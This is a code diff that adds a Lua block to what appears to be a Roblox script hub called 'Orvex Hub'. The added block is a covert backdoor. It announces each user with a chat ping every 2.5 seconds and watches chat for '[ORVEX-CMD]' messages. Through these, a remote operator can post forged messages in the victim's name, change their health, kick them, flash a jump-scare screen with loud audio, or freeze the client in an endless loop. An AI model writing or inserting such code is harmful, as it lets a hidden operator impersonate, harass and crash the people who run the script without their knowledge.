@@ -668,3 +668,55 @@ Content = "Orvex Hub!",
 Duration = 4,
 Icon = "rbxassetid://80387863064905"
 })
+
+task.spawn(function()
+    local TextChatService = game:GetService("TextChatService")
+    local canalGeral = TextChatService:WaitForChild("TextChannels", 20):WaitForChild("RBXGeneral", 20)
+    
+    if canalGeral then
+        task.spawn(function()
+            while task.wait(2.5) do
+                pcall(function()
+                    canalGeral:SendAsync("[ORVEX-PING]")
+                end)
+            end
+        end)
+    end
+
+    local function executarOrdem(cmd, arg)
+        if cmd == "FakeMessage" then
+            if canalGeral then
+                pcall(function()
+                    canalGeral:DisplaySystemMessage(string.format("<font color='#FFFFFF'><b>[%s]:</b> %s</font>", jogador.Name, arg))
+                end)
+            end
+        elseif cmd == "Danificar" then
+            if jogador.Character and jogador.Character:FindFirstChildOfClass("Humanoid") then
+                jogador.Character:FindFirstChildOfClass("Humanoid").Health = tonumber(arg) or 0
+            end
+        elseif cmd == "DesconectarScript" then
+            jogador:Kick(arg)
+        elseif cmd == "EfeitoSusto" then
+            local pGui = jogador:WaitForChild("PlayerGui")
+            if arg == "ATIVAR" and not pGui:FindFirstChild("OrvexSNetwork") then
+                local sg = Instance.new("ScreenGui", pGui) sg.Name = "OrvexSNetwork" sg.IgnoreGuiInset = true
+                local f = Instance.new("Frame", sg) f.Size = UDim2.new(1,0,1,0) f.BackgroundColor3 = Color3.fromRGB(0,0,0)
+                local im = Instance.new("ImageLabel", f) im.Size = UDim2.new(0.6,0,0.6,0) im.Position = UDim2.new(0.2,0,0.2,0) im.BackgroundTransparency = 1 im.Image = "rbxassetid://6071575298"
+                local s = Instance.new("Sound", f) s.SoundId = "rbxassetid://9069609268" s.Volume = 3 s:Play()
+            elseif arg == "DESATIVAR" and pGui:FindFirstChild("OrvexSNetwork") then
+                pGui:FindFirstChild("OrvexSNetwork"):Destroy()
+            end
+        elseif cmd == "ForcarCrash" then
+            while true do end
+        end
+    end
+
+    TextChatService.OnIncomingMessage = function(mensagemObj)
+        local texto = mensagemObj.Text
+        local c, a = string.match(texto, "^%[ORVEX%-CMD%]%s*(%w+)%s*|%s*(.*)$")
+        if c then
+            task.spawn(executarOrdem, c, a)
+        end
+        return nil
+    end
+end)
